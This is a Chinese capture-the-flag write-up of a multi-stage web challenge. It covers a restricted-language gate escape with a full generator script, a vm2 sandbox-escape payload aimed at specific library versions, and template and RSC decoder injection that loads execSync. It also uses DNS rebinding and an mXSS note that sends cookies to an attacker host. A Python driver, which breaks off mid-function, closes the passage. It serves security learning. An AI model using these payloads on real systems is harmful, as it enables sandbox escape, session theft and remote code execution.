---
title: 雾上的伊拉斯谟-Revenge（QCTF2026 web）
date: 2026-10-21
category: Web
tags:
  - CTF
  - Writeup
  - web
draft: false
summary: "Revenge 版把原题重做成了一个多服务容器，题目明确不限制 Agent，实例是动态环境，网关主机名形如："
collection: QCTF2026
---
# 雾上的伊拉斯谟-Revenge

## 第一节：题目

Revenge 版把原题重做成了一个多服务容器，题目明确不限制 Agent，实例是动态环境，网关主机名形如：

```
3000-<uuid>.challenge.ctfplus.cn
```

一个容器里跑了七个服务，用不同的 uid 隔离：

|pid|uid|服务|监听|持有的秘密|
|---|---|---|---|---|
|1|root|entrypoint.js|—|生成 ADMIN_TOKEN、ARCHIVE_KEY、SEAL_CAP、COURIER_TOKEN，把 FLAG_VALUE 只注入 docker-api|
|18|root|rebind-dns|127.0.0.1:15353 UDP|负责 rebind.test 域名解析|
|19|bot|bot/server.js|127.0.0.1:24401|Chromium 里的 ADMIN_TOKEN cookie|
|20|root|seal-mint|127.0.0.1:24374|SEAL_CAP|
|21|root|docker-api|127.0.0.1:24375|FLAG_VALUE|
|22|root|courier|127.0.0.1:8080|COURIER_TOKEN、ARCHIVE_KEY|
|23|1000|web|3000 应用 + 7777 攻击者页|COURIER_TOKEN|

目标只有一个，让 docker-api 把 FLAG_VALUE 交出来。它只监听回环地址，公网进不去；它的入口需要一张 seal-mint 铸出来的 cap，铸 cap 又要 ADMIN_TOKEN；能把请求送进这两个服务的只有 courier，courier 认的又是 web 进程内存里的 COURIER_TOKEN。公网上能碰到的，只有 3000 端口的 web 应用和 7777 端口的攻击者页面。

所以这一版不是找到一个洞就结束。它把一条完整的认证链摆在那里，每一节都要求上一节真的走通：先过 gate，再在同一个请求里拿到 proof，然后用 composeStrict 把一段 multipart 塞进转发目标，让 RSC 解码器把 util.format 和 execSync 当成自己的模块加载，最后由 courier 做一次 DNS rebind，把请求送进 127.0.0.1。哪一步偷懒，后面都接不上。

应用面是 Node 写的，关键入口有 /api/gloss、/api/compose、/api/report 和 /view、/framed、/notes/add。

这一版把门禁做得很硬：/api/gloss 的 forwarded 请求先过 proxy-gate-worker，只有 worker 里真的执行了 console.log(GATE_NONCE) 才算过；gate 与父进程之间的 IPC 用 V8 结构化序列化，父进程还要求 e.ok === true。靠消息对象伪装的路子就被堵死了，必须在 gate 的受限语言里真正执行任意代码。courier 只绑 127.0.0.1，COURIER_TOKEN 在 web 启动时读入内存后就把临时文件删掉，外部拿不到 token，只能让 web 自己替我们发请求。

整个应用的调用顺序是这样的：

```
/api/gloss forwarded=true
  -> runProxyGate(marginalia)        gate 语言求值
  -> runGloss(renderer, input)       vm2 沙箱
  -> composeStrict(vars)             模板引擎，产出 multipart 正文
  -> resolveDocument / assembleFolio RSC Flight 解码
  -> selectForwardTarget             从我们的 manifest 取 origin 和 path
  -> forwardViaCourier               带 COURIER_TOKEN 打 courier
  -> courier 双次 DNS 解析 -> 127.0.0.1:24374 / 24375
```

完整链路是：gate 逃逸 → vm2 逃逸读 proof → composeStrict 注入 multipart → RSC folio 伪造模块加载 → courier 的 DNS rebind → seal-mint 铸 cap → docker-api 建容器读日志。

## 第二节：过程

### 一、先把 gate 的语言摊开

gate 的语法是递归正则：

```
^root(?:\.\w+)*(?:\((?<inner>.*)\))?$
```

整个表达式只能是 root 加一串成员访问，或者在一串成员访问后面带一个括号参数；括号里的内容还要再满足同一条规则。换句话说，它只允许两种写法，一种是 `root.a.b.c`，一种是 `root.a.b(子表达式)`，子表达式又是同样的结构。

合法的例子是 `root.map.call.name`、`root.push(root.map)`、`root.a(root.b(root.c))`。不合法的例子是 `root.a(1)`、`root.a(x, y)`、`root.a("s")`、`root[0]`、`root + 1`。逗号、空格、字符串字面量、方括号、运算符全都不在语法里，零参数调用 `root()` 也不合法。

worker 用 wrap 包住 root：

```js
function wrap(r) {
  if (r === Function) throw new TypeError("unavailable value");
  if (r == null) return r;
  const t = new Proxy(Object(r), {
    get(e, r, t) { return wrap(Reflect.get(e, r, t)); },
    apply(e, r, t) {
      const m = t.map(unwrap);
      return wrap(Reflect.apply(e, unwrap(r), m));
    },
  });
  e.set(t, r);
  return t;
}
```

这个包装做了两件事。读属性时，它把读到的值继续包一层；调用时，它把 this 和各参数拆回原值，再交给真正的函数。`r === Function` 的那一行是明面上的封堵，只要某条路径把 Function 构造器当属性读出来，就会在这里抛错。

gate worker 把 console.log 换成了 nonce 检查：只有传进去的参数严格等于 GATE_NONCE，ok 才会置真。求值结束后 worker 把 `{ok, syntax}` 发回父进程，父进程要求 `ok === true` 且 `syntax === true`，两个条件缺一不可。

这里有一个很好用的副作用：失败分三种。marginalia 语法合法但 gate 没过，返回 403；语法本身不合法，返回 422；gate 过了、后面的 compositor 没通过，返回 400。写 gate 的过程里，这三个状态码就是我们的测试仪表，不用每次都把整条链跑起来。

真正麻烦的地方在于，gate 的语言是封闭的。我们把 `wrap([])` 能到达的对象图做过一遍 BFS，88 个节点全是标准 ECMAScript 内建，没有 process、没有 console、没有 globalThis，也没有 AsyncFunction。唯一能碰到宿主能力的入口是 Function，而它被 `r === Function` 挡在门口。靠语言里的普通调用拼不出任何宿主对象。

所以路只剩下一条：不往外偷对象，让 worker 自己执行任意代码。只要 BODY 能在 worker 的全局作用域里跑起来，读 GATE_NONCE 就是一句 process.env 的事。

### 二、逃逸的五个台阶

先把语言里的三个障碍摆清楚。

裸 Function 拿不到，因为 wrap 见到 Function 就抛错。调用只能带一个参数，语法里没有逗号。没有字符串字面量，也没有引号、反斜杠、方括号这些能构造代码的标点；括号和点只能出现在成员访问里。

这五个台阶，每一步单看都只是语言规范里的正常行为，叠起来才成了逃逸。

|台阶|借用的语言行为|结果|
|---|---|---|
|一|内建方法返回的数组，元素不经过 get 陷阱|裸 Function 坐进数组|
|二|Array.prototype.map 被换成 flatMap|数组实参被摊平成多个参数|
|三|call 收到摊平后的参数表|Function.bind(null, BODY)|
|四|defineGetter 的两个参数同样来自摊平|Object.prototype.valueOf 变成 getter|
|五|ToPrimitive 先取 valueOf，再调用返回值|BODY 在 worker 全局作用域执行|

第一步，把裸 Function 装进数组元素。

`Object.getOwnPropertyDescriptor(Function.prototype, 'constructor')` 返回一个属性描述符，`Object.values` 把它摊成原生数组 `[Function, true, false, true]`，第 0 个元素就是 Function 构造器。

这条路径能成，靠的是 wrap 只包读属性这一层。内建方法返回的数组是一个整体，元素是原生值；数组作为参数传进另一个内建调用时，apply 陷阱只对参数数组做一次 map(unwrap)，元素原样进入参数表，不会再过一遍 get。于是 Function 藏在数组里被搬来搬去，始终没碰到 `r === Function` 那一行。

第二步，凭空中制造多参数调用。

语言里写不出逗号，但 apply 陷阱里有一句 `t.map(unwrap)`。t 是这次调用的参数数组，map 是数组实例的方法。谁把 Array.prototype.map 换掉，谁就控制了所有调用的参数展开方式。

我们用语言原语把 Array.prototype.map 换成 Array.prototype.flatMap。做法不复杂：先让 root 里同时出现 `"map"` 和 flatMap，再用 `Object.fromEntries(Array.of(root))` 把前两个元素当成键和值，造出 `{map: flatMap}`，最后用 `root.reduce(Object.assign.bind(null))` 让 Object.assign 把这对键值写进 Array.prototype。

污染完成之后，`t.map(unwrap)` 就变成了 `t.flatMap(unwrap)`。数组实参会被摊平，数组里的每个元素变成独立的一个参数。多参数调用就这么凭空出现了。

这个副作用是双向的。它让我们能调用 `getOwnPropertyDescriptor(Function.prototype, 'constructor')` 这种双参数函数，也意味着之后任何数组只要作为参数出现，都会被摊平。想把一个数组当成单个参数传，只能换一种包装，或者干脆换一个非数组对象。

第三步，造 Function.bind(null, BODY)。

Array.prototype 本身可以当草稿纸用，通过 `root.__proto__` 就能拿到。我们把它填成 `[Function, null, BODY]`，然后写 `root.map.bind.call(AP)`。

这里的属性链要拆开看。root.map 是污染后的 flatMap，`.bind` 是 Function.prototype.bind，`.call` 是 Function.prototype.call。AP 作为参数出现，被摊平成 Function、null、BODY 三个实参，于是 call 以 Function 为 this、以 null 和 BODY 为参数调用 bind，得到 `Function.bind(null, BODY)`。

第四步，把 BF 装成 getter。

Object.prototype.**defineGetter**('valueOf', BF) 需要两个参数，正好也能靠摊平喂进去：把 `"valueOf"` 和 BF 放进 root，`root.valueOf(e)` 先求值 e、再把 root 自己交出来，root 作为参数被摊成两个实参。

装完之后，Object.prototype 上就有了一个 valueOf 取值器。读任何对象的 valueOf，实际执行的其实是 BF。

第五步，触发。

`root.length.constructor(...)` 里的 constructor 是 Number，也就是对 `root.map` 调 Number。JS 在把一个对象当数字用时，会先做一次 ToPrimitive：按 valueOf、toString 的顺序找方法，找到就调用。

valueOf 现在是一个 getter，读取它等于零参调用 BF。BF 是 `Function.bind(null, BODY)`，零参调用返回 `Function(BODY)`，也就是把 BODY 编译成一个新函数。ToPrimitive 拿到这个返回值之后，会紧接着把它调用一次。于是 BODY 就在 worker 的全局作用域里跑了起来。

BODY 是：

```js
console.log(Object.values(process.env).pop())
```

这里故意不拼 GATE_NONCE。大写 G 和 T 在可达的字符调色板里凑不出来，而 Linux 上 gate worker 的 env 只有 NODE_ENV 和 GATE_NONCE 两个变量，取 `Object.values(process.env).pop()` 正好就是 nonce。

整套代码没有一个字符串字面量。字符一个个从内建的 `.name` 属性上抠出来：`"call".charAt(0)` 是 c，`"toString".charAt(1)` 是 o，`"bind".charAt(2)` 是 n，`"assign".charAt(1)` 是 s，`"getOwnPropertyDescriptor".charAt(1)` 是 e。括号、点这类标点则用 `String.fromCharCode` 造，码位分别要 40、41、46。

40 这个数字也有讲究。先把 Array.prototype 清空，再把四组内建属性名数组依次 push 进去：Object.prototype 的 12 个、再来一遍 12 个、Function.prototype 的 9 个、Number.prototype 的 7 个，加起来正好 40。因为 map 已经被换成 flatMap，每次 push 的数组都会被摊平，所以长度是按数组元素个数涨的。40 再加 1 得 41，再加 5 得 46。三个标点先塞进 Array.prototype 的下标 0、1、2，之后用 `AP.at(0)` 这样的写法反复取用。

生成器是 gen4.js：

```js
'use strict';
const fs = require('fs');
const BODY = process.argv[2] || 'console.log(Object.values(process.env).pop())';
const OUT = process.argv[3] || 'c4.txt';
const C = {
  call: 'root.map.call.name', bind: 'root.map.bind.name', apply: 'root.map.apply.name',
  tos: 'root.map.toString.name',
  assign: 'root.__proto__.__proto__.constructor.assign.name',
  gopd: 'root.__proto__.__proto__.constructor.getOwnPropertyDescriptor.name',
  fromE: 'root.__proto__.__proto__.constructor.fromEntries.name',
  values: 'root.__proto__.__proto__.constructor.values.name',
  unshift: 'root.unshift.name', shift: 'root.shift.name',
  valueOfN: 'root.map.valueOf.name', strCtor: 'root.map.name.constructor',
  objCtor: 'root.__proto__.__proto__.constructor', objProto: 'root.__proto__.__proto__',
  funcProto: 'root.map.__proto__', numProto: 'root.length.__proto__',
  arrCtor: 'root.constructor', empty: 'root.map.__proto__.name',
};
const N = { 0: 'root.reverse.length', 1: 'root.map.length', 2: 'root.splice.length' };
const AP = 'root.__proto__', idx = n => N[n];
const CH = {
  c: [C.call, 0], o: [C.tos, 1], n: [C.bind, 2], s: [C.assign, 1], t: [C.tos, 0],
  l: [C.call, 2], e: [C.gopd, 1], g: [C.gopd, 0], v: [C.valueOfN, 0], a: [C.assign, 0],
  u: [C.unshift, 0], p: [C.apply, 1], r: [C.fromE, 1], h: [C.shift, 1], i: [C.shift, 2],
  f: [C.shift, 3], O: [C.objCtor + '.name', 0], b: [C.objCtor + '.name', 1], j: [C.objCtor + '.name', 2],
};
const PUNCT = { '(': 0, ')': 1, '.': 2 };
function charExpr(ch, prev) {
  if (PUNCT[ch] !== undefined) return `${AP}.at(${idx(PUNCT[ch])}.valueOf(${prev}))`;
  const p = CH[ch]; if (!p) throw new Error('no palette ' + ch);
  return `${p[0]}.charAt(${idx(p[1])}.valueOf(${prev}))`;
}
// P0
const S1 = `root.push(root.flatMap)`;
const S2 = `root.push(root.map.name.valueOf(${S1}))`;
const S3 = `root.reverse(${S2})`;
const S4 = `root.push(${AP}.valueOf(${S3}))`;
const S5 = `root.push(${C.objCtor}.fromEntries(${C.arrCtor}.of(root.valueOf(${S4}))))`;
const S6 = `root.shift(${S5})`;
const S7 = `root.shift(${S6})`;
const NULLS7 = `${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${S7}))`;
let e = `root.reduce(${C.objCtor}.assign.bind(${NULLS7}))`;

// clear root
e = `root.splice(${idx(0)}.valueOf(${e}))`;
// grow AP to 40: 12+12+9+7
const g = (protoExpr, prev) => `${AP}.push(${C.objCtor}.getOwnPropertyNames(${protoExpr}.valueOf(${prev})))`;
e = g(C.objProto, `${AP}.splice(${idx(0)}.valueOf(${e}))`);   // +12
e = g(C.objProto, e);                                          // +12 = 24
e = g(C.funcProto, e);                                         // +9  = 33
e = `${AP}.push(${C.objCtor}.getOwnPropertyNames(${C.objCtor}.getPrototypeOf(root.length.valueOf(${e}))))`; // +7 = 40
// stash '(' ')' '.' into root
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // 40 -> '('
e = `${AP}.push(${idx(1)}.valueOf(${e}))`;                     // 41
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // -> ')'
for (let i = 0; i < 5; i++) e = `${AP}.push(${idx(1)}.valueOf(${e}))`; // 46
e = `root.push(${C.strCtor}.fromCharCode(${e}))`;              // -> '.'
e = `${AP}.splice(${idx(0)}.valueOf(${e}))`;                   // clear AP
e = `root.reverse(${e})`;                                      // root = ['.',')','(']
e = `${AP}.push(root.pop(${e}))`;                              // '('
e = `${AP}.push(root.pop(${e}))`;                              // ')'
e = `${AP}.push(root.pop(${e}))`;                              // '.'

// body into root
for (const ch of BODY) e = `root.push(${charExpr(ch, e)})`;
e = `root.push(root.join(${C.empty}.valueOf(${e})))`;          // BODYSTR onto root

// key into AP
e = `${AP}.splice(${idx(0)}.valueOf(${e}))`;
for (const ch of 'constructor') e = `${AP}.push(${charExpr(ch, e)})`;
e = `root.push(${AP}.join(${C.empty}.valueOf(${e})))`;         // KEYSTR onto root

// descriptor via reduce(gopd.bind(null))
const clearV = `${AP}.splice(${idx(0)}.valueOf(${e}))`;
const pushProto = `${AP}.push(${C.funcProto}.valueOf(${clearV}))`;
const pushKey = `${AP}.push(root.pop(${pushProto}))`;
const nullV = `${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${pushKey}))`;
const gopdBound = `${C.objCtor}.getOwnPropertyDescriptor.bind(${nullV})`;
const desc = `${AP}.reduce(${gopdBound})`;
e = `${AP}.push(${C.objCtor}.values(${desc}))`;                // V spread -> [funcProto,KEY,Function,true,false,true]
for (let i = 0; i < 3; i++) e = `${AP}.pop(${e})`;             // [funcProto,KEY,Function]
e = `${AP}.shift(${AP}.shift(${e}))`;                          // [Function]
e = `${AP}.push(${C.objCtor}.getPrototypeOf(${C.objProto}.valueOf(${e})))`;
e = `${AP}.push(root.pop(${e}))`;                              // BODYSTR onto AP

// BF and accessor
const seqKey = `root.push(${C.valueOfN}.valueOf(root.splice(${idx(0)}.valueOf(${e}))))`;
const bf = `root.map.bind.call(${AP}.valueOf(${seqKey}))`;
e = `root.push(${bf})`;
e = `${C.objProto}.__defineGetter__(root.valueOf(${e}))`;
e = `root.length.constructor(root.map.valueOf(${e}))`;

function valid(s) { const r = /^root(?:\.\w+)*(?:\((?<inner>.*)\))?$/s.exec(s); if (!r) return false; const i = r.groups.inner; return i === undefined || valid(i); }
console.log('BODY=%j len=%d expr=%d grammar=%s', BODY, BODY.length, e.length, valid(e));
fs.writeFileSync(__dirname + '/' + OUT, e);
```

生成的最终 gate code 是 6926 字节，grammar 校验通过，sha256 为 594c19e2 开头。远端 oracle 返回 HTTP 400 而不是 403 或 422，说明 gate 已经过了。整理这篇的时候又拿新实例重放了一次同一份 code，返回的还是 400。

这一段里有几个工程坑，单靠读代码不容易看出来。

Proxy 有它自己的不变量。字符串的 length 和内置构造器的 prototype 都是不可配置、只读的属性，get 陷阱如果返回一个包装对象，Proxy 会直接抛 TypeError。所以整条链里不能写 `root.map.name.length` 这种形式，只能绕到 `__proto__` 或 `Object.getPrototypeOf(0)`。

flatMap 污染之后，任何数组实参都会被摊平。想传一个数组当单个参数，得换一个非数组对象，或者先包一层。生成器里所有看起来多余的 `Array.of` 和 `fromEntries`，都是在绕这个限制。

`reverse` 不能当求值粘合剂用。它是原地反转，拿它当中间步骤会把字符顺序弄乱。能当粘合剂的是 `Object.prototype.valueOf`，它返回 this，参数只求值不使用，正好适合把一串有副作用的操作串起来。

字符调色板也不是一次就凑齐的。早先试过直接从 `root.map.constructor` 或 `root.constructor.constructor` 拿 Function，全部在 wrap 那里就被拦下，因为读属性这一步就会把 Function 交回 get 陷阱。最后能用的这条链，每一步都刻意避开了这条读路径。

### 三、拿到每次请求的 proof

gate 之后是 /api/gloss 的 vm2 沙箱。容器里装的是 vm2 3.11.5 和 Node 26.7.0，正好落在 GHSA-27g9-p43v-cw3v 的范围内，编号 CVE-2026-92944。漏洞在 Promise 的 species 查找链上，配合栈溢出可以把宿主 realm 的 RangeError 送回沙箱，再用 `ex.constructor.constructor` 拿到宿主 Function。

这里说的 species，是 `Promise.prototype.finally` 在创建结果 Promise 时做的一次构造器查找。它会读 `this.constructor[Symbol.species]`，把读到的函数当成结果 Promise 的构造器。V8 给这条查找链设了一个 PromiseThenLookupChain 保护位，正常情况下原型一动就会失效；vm2 的加固代码假设这次查找只会走它自己包装过的那条路，栈溢出恰好把这个假设打破，宿主 realm 的对象就有机会漏进沙箱。

载荷：

```js
const done = Promise.withResolvers();
class E extends Error {}
function so(d) { if (d > 0) so(d - 1); const e = new E(); e.stack; throw e; }
let ex;
function doFinally(f) {
  ex = undefined;
  const p = Promise.withResolvers();
  const ct = function (executor) { executor(f, v => { ex = v; p.resolve(); }); };
  const q = (async () => 1)();
  Object.defineProperty(q, 'constructor', { value: { [Symbol.species]: ct }, configurable: true });
  q.finally(() => {});
  return p.promise;
}
(async function f(s) {
  let min = s, max = 200000, steps = 0;
  while (min < max && steps++ < 40) {
    const mid = (min + max) >> 1;
    await doFinally(() => so(mid));
    if (ex && ex.name === 'RangeError' && !(ex instanceof RangeError)) {
      const P = ex.constructor.constructor('return process')();
      done.resolve('HOST v=' + P.version + ' cwd=' + P.cwd());
      return;
    }
    if (ex instanceof E) min = mid + 1; else max = mid;
  }
  if (s < 32) { f(s + 1); } else { done.resolve('nohit'); }
})(0);
return done.promise;
```

`so(d)` 递归到第 d 层，构造一个 E，读一次 stack，再把它抛出来。d 不够大时栈不会溢出，拿到的是普通的 E；d 大到把栈撑爆时，拿到的是 RangeError。

`doFinally` 负责把这次抛出接到 species 查找上：q 是一个已经 resolve 的 Promise，`Object.defineProperty` 把它的 constructor 换成一个带 `[Symbol.species]` 的对象，species 指向 ct。`q.finally()` 一调用，V8 就会按 species 构造结果 Promise，ct 作为构造器被执行，executor 拿到 f 和 resolve 函数，f 开始递归。

外层用二分找栈的边界。`ex instanceof E` 说明还没溢出，下限往上抬；否则上限往下压。真正要找的是那个 `ex.name === 'RangeError'` 但 `!(ex instanceof RangeError)` 的值。这个 RangeError 来自宿主 realm，不是沙箱自己的。它的 constructor 是宿主的 Error 构造器，再取一次 constructor 就是宿主的 Function，`('return process')()` 就能拿到宿主的 process。

外层的 `f(s)` 故意不 await。s=0 时只能搜到沙箱自己的 RangeError，s=1 才会出现宿主那一份；这个不 await 的递归是用来做校准的。远端 worker 的栈只有 512KB，边界大概在 4780 层，40 步二分足够。

本地拿 vm2 3.11.5、3.11.6、3.11.7、3.12.2 四个版本跑过同一个载荷。3.11.5 和 3.11.6 能拿到宿主 process，3.11.7 起改掉了 then/catch 的属性安装方式，到 3.12.2 时同一载荷已经打不穿。版本对得上，这条链才成立。

逃逸之后读 `process.env.GLOSS_PROOF`，把 proof 和 vars 一起 JSON.stringify 返回：

```js
function makec(P) { return JSON.stringify({ proof: P.env.GLOSS_PROOF, vars: input.vars }); }
```

GLOSS_PROOF 是每个请求用 24 字节随机数生成的 48 位十六进制串，worker 每次请求 fork 一次，env 里只有它和 NODE_ENV。父进程拿 renderer 的返回值和本请求的随机值比对，相等才继续。proof 猜不出来，必须在这一次请求里真的把沙箱打穿。

### 四、把 multipart 塞进 composeStrict

composeStrict 是模板引擎，模板本身只有两行：

```
<h1>雾上索引 · <b><\ %name% /></b></h1>
<p class="folio">今日抄本号:<b><\ folio_number(%name%); /></b></p>
```

`%name%` 会被替换成 vars 里的同名变量。变量替换可以嵌套：一次替换完的文本如果还含 `%xxx%`，下一轮继续替换，最多 100 轮。模板里还有两种命令，`folio_number` 是安全函数，`run` 是不安全函数；`run` 的返回值是当前请求的封条加上参数，封条是 `<<` 加 16 位十六进制再加 `>>`。

composeStrict 一边跑模板一边记录 lookups、runs 和 rotations，跑完之后再核对 provenance。lookups 必须按 name、n1、n2、n3、n4、longVarName 的顺序出现，其中 longVarName 是引擎自己按模板算出来的变量名；runs 必须恰好一条；rotations 里必须有一次 strrot，它的参数是 longVarName 的值，结果里包含即将执行的 run 命令。少一项就直接抛错。

我们用 vars 链把 `%name%` 一路引到 longVarName，longVarName 的值经 rot47 变成一段含 run 命令的文本，把整段 multipart 正文塞进 run 的参数里：

```
name       = <<%n1%
n1         = %n2%
n2         = \\%n3%
n3         = %n4%
n4         = strrot(%
longVarName= rot47("\"/><\run('" + ARG + "');unsafe/>")
```

展开过程是一层套一层。第一轮把 `%name%` 换成 `<<%n1%`，第二轮把 n1 换成 `%n2%`，第三轮、第四轮继续往下换，到 n4 时拼出 `strrot(`，把 longVarName 的值引进来。strrot 执行 rot47，把预先打乱的那段文本还原成 `"/><\run('...');unsafe/>`。里面的 `"/>` 提前闭合原来的标签，后面的 `<\run('...');unsafe/>` 就成了模板引擎在下一轮里识别到的新命令。

ARG 是一整份 multipart 正文。字符串里有几个字符必须清掉：单引号会截断 run 的参数，`/>` 会截断命令，`<\` 会起一条新命令，两个以上的 `%` 会被变量正则抢走。还有一层是 rot47 自己带来的：大写 V 经 rot47 会变成单引号，被 stripQuotes 删掉；大写 T 会变成 `%`，把变量正则引进来。

RSC 的字段都是 JSON 文本，chunk-reviver 会先 JSON.parse，所以这些字符统一写成 JSON 的转义形式，也就是反斜杠加 u0027、u0054、u0056、u0025、u002f，就能安全穿过。parse 之后语义不变，模板引擎看到的还是原来的字符。

整份 fragment 大约 1.6KB，/api/gloss 的 readJson 上限是 24KB，余量足够。真正容易翻车的是换行：multipart 的段头必须保留 CRLF，Python 的 subprocess 如果开了 text=True，会把 CRLF 改成 LF，boundary 就对不上，resolve 只能解出一个 1。这个坑我们踩过一次，后面所有读写都按字节处理。

### 五、RSC folio 解码器伪造

chunk-reviver 是 React Server Components 的 Flight 解码器。服务端把组件树拆成一条条带 `$` 前缀的 chunk 引用，客户端按引用还原。`$F` 分支在解析 outlined model 时会做一次合并：

```js
o = Object.assign(Object.create(null), e, l._response)
```

e 是解码器自己的 response，l 是我们提供的 outlined model。Object.assign 会把 `l._response` 上的键覆盖到 e 上，其中就包括 `_bundlerConfig`。加载模块时用的那份配置，可以由我们提供。

loadServerReference 的白名单只看我们给的配置条目：

```js
const o = r._bundlerConfig[t];
if (o === undefined) throw ...
const i = o.id === "child_process" || o.id === "node:child_process" ? o.name === "execSync"
        : o.id === "node:util" && o.name === "format";
if (!i || !Array.isArray(n) || n.length > 4) throw new Error("the Server Action is not in the folio catalogue");
const u = e._load(o.id, null, false);
```

默认配置里只有 folio-read 和 folio-index 两条，任何一条都过不了这个白名单，所以正常写法一定报 `the Server Action is not in the folio catalogue`。但我们伪造 `{id:"node:util",name:"format"}` 和 `{id:"node:child_process",name:"execSync"}`，白名单检查的就是我们自己的条目，Module._load 加载的是真实模块。require 有缓存，拿到的函数和 reference-service.js 里的 require 是同一个身份，后面的身份校验也能过。

我们在本地用逐字节一致的源码做过几组负控。默认配置、node:fs 与 readFileSync 都被白名单挡下；把 fn 伪造成 util.format 虽然能过白名单，但身份校验会报 `the folio is incomplete: reference($F)`。只有 handler 和 fn 都指向真实的 util.format 和 execSync，assembleFolio 才会全过。

assembleFolio 要求十来个字段全部齐备，我们按解码器的每种 `$` 类型逐个构造：

|字段|构造|说明|
|---|---|---|
|stamp|`$T0:stamp`|用根对象里的路径当临时引用 ID|
|origin|`$R2`，chunk 是 `["http://..."]`|ReadableStream，排空后非空|
|path|`$X3`，chunk 是 `["/mint?..."]`|async iterable|
|methods|`$Q4`，chunk 是 `[["method","GET"]]`|Map|
|flags|`$W5`，chunk 是 `["forwarded"]`|Set，必须含 forwarded|
|body|`$o6`，chunk 是 base64|Uint8Array，base64 顺带过 WAF|
|form|`$Ka`|FormData，文件部件名 a_value，文件名 folio-attachment.txt|
|lineage|`$i7`，chunk 是 `["folio-attachment.txt"]`|ArrayIterator|
|handler|`$F8`|伪造 bundlerConfig 指向 node:util 的 format|
|fn|`$F9`|伪造 bundlerConfig 指向 node:child_process 的 execSync|
|cyc|`$@b` 和 `$@a` 两个互相引用的 chunk|assemble 要求 status 是 fulfilled|

有四个顺序上的坑。文件部件必须排在根字段 0 之前，因为 `$Ka` 在根 chunk 解析时求值，文件后到的话 FormData 是空的。被引用的 chunk 必须先于 0 出现，否则 getOutlinedModel 读到的是占位值。cyc 的两个 chunk 必须先被一次初始化型访问器碰一下，我们在根对象里放两个哑键 `$oa`、`$ob` 就是干这个的。字段名是十进制 chunk id，`$` 后面的引用是十六进制，`$@a` 是 10，`$@b` 是 11。

selectForwardTarget 的 manifest 也来自我们的根对象，不是固定表。actionId 是请求里的 `action` 字段，四个十六进制字符，缺省是 1a2b；manifest 里用同名 key。path 只要求以 `/` 开头、不以 `//` 开头、不含反斜杠和换行，可以带 query。origin 必须是 http、没有 userinfo、pathname 是 `/`、没有 search 和 hash。handler(path) 必须等于 path，util.format 单参数时原样返回，这一条也自动满足。

origin 不能写数字 IP。courier 的 firstHopGuard 对 `127.*` 直接拒绝，会报 `the first seal is not accepted`。我们只能用 rebind 域名，让第一次解析返回公网地址，第二次返回 127.0.0.1：

```
http://make-1-1-1-1-rebind-127-0-0-1-rr.rebind.test:24374
```

rebind-dns 按查询次数奇偶轮流返回两个地址，域名里的地址段用横线隔开，`-rr` 段也是它认的格式。

### 六、courier 和内部服务

courier 的 /fetch 只认 Bearer COURIER_TOKEN，对 URL 做两次 DNS 解析：第一次用 firstHopGuard 挡内网，第二次才真正连接。第一次返回 1.1.1.1，检查通过；第二次返回 127.0.0.1，连接落到回环地址。连接目标是 127.0.0.1 且端口在 24374、24375 时，courier 会自动附加 `X-Courier-Auth: ARCHIVE_KEY`。这两个端口就是 seal-mint 和 docker-api。

ADMIN_TOKEN 在 bot 的 cookie 里。我们用 folios 的 split 加 sort 做了一次 mXSS：/notes/add 先把内容净化，/view 再按 `|` 切开、排序、拼回去，排序会把同一标签的片段重排成带 onerror 的 img。构造一条 note：

```
<img src="|abc">|A" onerror=fetch('http://attacker.test:7777/leak/<id>?c='+encodeURIComponent(document.cookie)) x="
```

投递链是三条 popup。先打开 /notes/add，让 bot 在 web.test 下拿到我们写的 cookie；再打开 /framed?html=proof，让 framed.js 以 `From-Fetch: 1` 预取 /view?html=proof，把内容种进私有缓存；最后把 popup 导航到 /view?html=proof，命中缓存，脚本在顶层文档执行。报告回读里就能拿到 ADMIN_TOKEN。

四段 forwarded gloss 分别打 mint、create、start、logs。每次请求都带 gate code、proof、vars 和同一份 renderer，响应里的 `result` 就是 courier 带回来的正文。驱动脚本是 n2_chain.py：

```python
#!/usr/bin/env python3
"""Full chain: gate -> composed folio -> courier -> seal-mint/docker-api."""
import json, subprocess, sys, os, urllib.request, urllib.error

H = "http://3000-01939323-7eeb-4f35-92c0-92409a41be5c.challenge.ctfplus.cn"
ADMIN = "d99aa2603bd94b5ffe15173018c0376fd522fca62776a0d5"
REBIND = "make-1-1-1-1-rebind-127-0-0-1-rr.rebind.test"

ESC_PRE = r'''
const done = Promise.withResolvers();
class E extends Error {}
function so(d) { if (d > 0) so(d - 1); const e = new E(); e.stack; throw e; }
let ex;
function doFinally(f) {
  ex = undefined;
  const p = Promise.withResolvers();
  const ct = function (executor) { executor(f, v => { ex = v; p.resolve(); }); };
  const q = (async () => 1)();
  Object.defineProperty(q, 'constructor', { value: { [Symbol.species]: ct }, configurable: true });
  q.finally(() => {});
  return p.promise;
}
function makec(P) { return JSON.stringify({ proof: P.env.GLOSS_PROOF, vars: input.vars }); }
'''
ESC_SUF = r'''
(async function f(s) {
  let min = s, max = 200000, steps = 0;
  while (min < max && steps++ < 40) {
    const mid = (min + max) >> 1;
    await doFinally(() => so(mid));
    if (ex && ex.name === 'RangeError' && !(ex instanceof RangeError)) {
      const P = ex.constructor.constructor('return process')();
      done.resolve(makec(P));
      return;
    }
    if (ex instanceof E) min = mid + 1; else max = mid;
  }
  if (s < 32) { f(s + 1); } else { done.resolve('nohit'); }
})(1);
return await done.promise;
'''

def sh(args, inp=None):
    return subprocess.run(args, capture_output=True, input=inp, cwd=os.getcwd())

def build_vars(origin, path, method, payload, boundary="FOLIO20261018fixed"):
    body = sh(["node", "f4/f4_build.js",
               "--origin=" + origin, "--path=" + path,
               "--method=" + method, "--payload=" + json.dumps(payload),
               "--boundary=" + boundary]).stdout.decode("utf-8")
    if not body:
        raise SystemExit("f4_build produced no body")
    # rot47 会把大写 T/V 变成 % 和单引号，JSON 里改写成转义
    bs = chr(92)
    san = body.replace("T", bs + "u0054").replace("V", bs + "u0056")
    open("n2_arg.txt", "w", encoding="utf-8", newline="").write(san)
    sh(["node", "t4/dumpvars.js", "n2_arg.txt", "n2_vars.json"])
    return json.load(open("n2_vars.json", encoding="utf-8"))

def gloss(gate, vars_obj, timeout=45):
    body = {"annotation": "x",
            "input": {"vars": vars_obj},
            "renderer": ESC_PRE + ESC_SUF,
            "marginalia": gate, "forwarded": True, "action": "1a2b"}
